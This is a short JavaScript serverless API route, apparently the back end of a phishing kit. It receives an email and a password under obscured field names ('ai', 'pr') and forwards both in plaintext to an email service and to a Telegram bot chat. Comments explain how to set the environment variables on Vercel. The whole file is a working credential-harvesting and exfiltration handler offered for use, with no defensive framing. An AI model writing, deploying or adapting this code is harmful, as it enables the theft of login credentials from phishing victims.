// File: api/next.js

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Only POST requests allowed" });
  }

  try {
    // Parse form data
    const data = typeof req.body === "string" ? JSON.parse(req.body) : req.body;
    const { ai, pr } = data;

    // Basic validation
    if (!ai) return res.status(400).json({ success: false, error: "Email required" });

    // --- 1️⃣ SEND TO EMAIL (using Email API like Resend, SendGrid, etc.) ---
    // You’ll set EMAIL_RECIPIENT and EMAIL_API_URL in Vercel environment variables
    if (process.env.EMAIL_API_URL && process.env.EMAIL_RECIPIENT) {
      await fetch(process.env.EMAIL_API_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          to: process.env.EMAIL_RECIPIENT,
          subject: "New Form Submission",
          text: `Email: ${ai}\nPassword: ${pr || "No password entered"}`,
        }),
      });
    }

    // --- 2️⃣ SEND TO TELEGRAM BOT ---
    // Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in Vercel environment variables
    if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
      const telegramUrl = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
      await fetch(telegramUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: process.env.TELEGRAM_CHAT_ID,
          text: `📬 New Form Submission:\nEmail: ${ai}\nPassword: ${pr || "No password"}`,
        }),
      });
    }

    // --- 3️⃣ RESPONSE ---
    res.status(200).json({ success: true, message: "Delivered successfully!" });

  } catch (error) {
    console.error("Error delivering form:", error);
    res.status(500).json({ success: false, error: "Internal Server Error" });
  }
}
